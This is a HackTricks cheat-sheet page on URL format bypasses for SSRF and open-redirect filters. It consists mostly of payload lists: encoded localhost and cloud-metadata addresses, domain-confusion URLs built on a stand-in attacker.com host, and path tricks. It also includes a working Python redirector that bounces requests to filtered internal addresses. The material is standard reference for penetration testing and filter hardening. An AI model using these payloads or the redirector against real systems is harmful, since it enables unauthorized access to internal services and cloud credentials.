# URL Format Bypass

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

### Localhost

```bash
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127。0。0。1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```

![](<../../.gitbook/assets/image (649) (1) (1).png>)

The **Burp extension** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) implements IP formatting bypasses.

### Domain Parser

```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attacker。com
ⒶⓉⓉⒶⒸⓀⒺⓡ.Ⓒⓞⓜ
```

```
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾
⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗
⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰
⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ
Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ
ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

### Domain Confusion

```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com
```

### Paths and Extensions Bypass

If you are required that the URL must end in a path or an extension, or must contain a path you can try one of the following bypasses:

```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```

### Fuzzing

The tool [**recollapse**](https://github.com/0xacb/recollapse) can generate variations from a given input to try to bypass the used regex. Check [**this post**](https://0xacb.com/2022/11/21/recollapse/) also for more information.

### Bypass via redirect

It might be possible that the server is **filtering the original request** of a SSRF **but not** a possible **redirect** response to that request.\
For example, a server vulnerable to SSRF via: `url=https://www.google.com/` might be **filtering the url param**. But if you uses a [python server to respond with a 302](https://pastebin.com/raw/ywAUhFrv) to the place where you want to redirect, you might be able to **access filtered IP addresses** like 127.0.0.1 or even filtered **protocols** like gopher.\
[Check out this report.](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)

```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
    print("Usage: {} <port_number> <url>".format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

## Explained Tricks

### Blackslash-trick

In short, the _backslash-trick_ relies on exploiting a minor difference between two “URL” specifications: the [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing), and [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B). RFC3986 is a generic, multi-purpose specification for the syntax of _Uniform Resource Identifiers_, while the WHATWG URL Standard is specifically aimed at the Web, and at URLs (which are a subset of URIs). Modern browsers implement the WHATWG URL Standard.

Both of them describe a way of parsing URI/URLs, with one slight difference. The WHATWG specification describes [one extra character](https://url.spec.whatwg.org/#authority-state), the `\`, which behaves just like `/`: ends the hostname & authority and starts the path of the URL.

![The two specifications parsing the same URL differently](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg)

### Other Confusions

![](<../../.gitbook/assets/image (629).png>)

image from [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
